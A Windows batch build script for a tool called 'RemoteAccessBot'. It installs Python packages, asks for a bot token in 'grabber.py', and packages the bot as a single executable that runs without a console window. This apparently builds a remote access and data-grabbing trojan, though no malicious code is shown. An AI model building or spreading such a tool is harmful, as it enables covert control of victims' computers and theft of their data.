@echo off
title RemoteAccessBot - Installing Requirements..
echo.
echo [i] Installing required python packages from requirements.txt...
echo.

pip install -r requirements.txt

cls
title RemoteAccessBot - Installation complete!
echo.
echo [!] Python packages successfully installed.
echo.
timeout /t 4 >nul

cls
title RemoteAccessBot - Token / Prefix
echo.
echo [i] Please make sure your bot token is set in the grabber.py file. 
echo [i] Same with your command prefix of choice.
echo.
echo [i] Press enter when ready.
pause >nul

cls
title RemoteAccessBot - Building Executable..
echo.
echo [i] Started building executable..
echo.

REM Feel free to adjust this to your liking
pyinstaller --onefile --noconsole RemoteAccessBot.py

cls
title RemoteAccessBot - Build complete!
echo.
echo [!] Executable built successfully.
echo [i] Thanks for using RAB!
echo.
pause